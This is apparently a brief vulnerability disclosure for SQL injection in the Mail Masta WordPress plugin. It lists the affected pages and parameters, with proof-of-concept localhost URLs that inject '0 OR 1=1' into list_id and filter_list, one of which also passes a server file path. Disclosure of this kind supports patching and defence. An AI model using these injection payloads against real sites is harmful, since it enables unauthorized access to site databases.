Wordpress-Plugin-Mail-Masta-SQL-Injection
=========================================
SQL injection

Page: /inc/lists/csvexport.php
GET Parameter: list_id
http://127.0.0.1/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php


Page: /inc/lists/view-list.php (Requires authentication to Wordpress admin)
GET Parameter: filter_list
http://127.0.0.1/wordpress/wp-admin/admin.php?page=masta-lists&action=view_list&filter_list=0+OR+1%3D1


Page: /inc/campaign/count_of_send.php (Requires authentication to Wordpress admin)
POST Parameter: camp_id
http://127.0.0.1/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=/var/www/html/wordpress/wp-load.php


Page: /inc/campaign_save.php (Requires authentication to Wordpress admin)
POST Parameter: list_id
